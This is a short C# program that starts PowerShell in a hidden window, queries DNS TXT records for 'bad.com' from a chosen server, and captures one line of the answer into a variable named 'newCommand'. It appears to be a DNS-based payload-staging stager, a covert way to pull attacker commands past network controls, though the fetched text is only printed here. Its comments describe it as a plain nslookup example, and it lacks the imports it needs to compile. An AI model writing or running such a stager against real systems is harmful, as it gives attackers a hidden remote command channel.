using System.Diagnostics;

class Program
{
    static void Main()
    {
        // PowerShell command as a string (e.g., nslookup)
        string psCommand = "powershell (nslookup -q=txt bad.com 192.168.10.22)[6]";

        // Run the PowerShell command and get the results
        string result = RunPowerShellCommand(psCommand);

        // Show the command that is going to be run
        Console.WriteLine($"Executing \"{psCommand}\"");

		// Turn the output of psCommand into a string
        string newCommand = result;

        // Print the string
        Console.WriteLine($"{ result }");
    }

    static string RunPowerShellCommand(string command)
    {
        // Initialize the process to run PowerShell
        ProcessStartInfo processStartInfo = new ProcessStartInfo
        {
            FileName = "powershell.exe",      // Specify PowerShell executable
            Arguments = command,              // Pass the command to execute
            RedirectStandardOutput = true,    // Redirect the standard output
            RedirectStandardError = true,     // Redirect error output
            UseShellExecute = false,          // Do not use the shell to start the process
            CreateNoWindow = true             // Do not create a new window
        };

        // Start the process and read the output
        using (Process process = Process.Start(processStartInfo))
        {
            using (StreamReader reader = process.StandardOutput)
            {
                // Read the entire output from the PowerShell command
                return reader.ReadToEnd();
            }
        }
    }
}
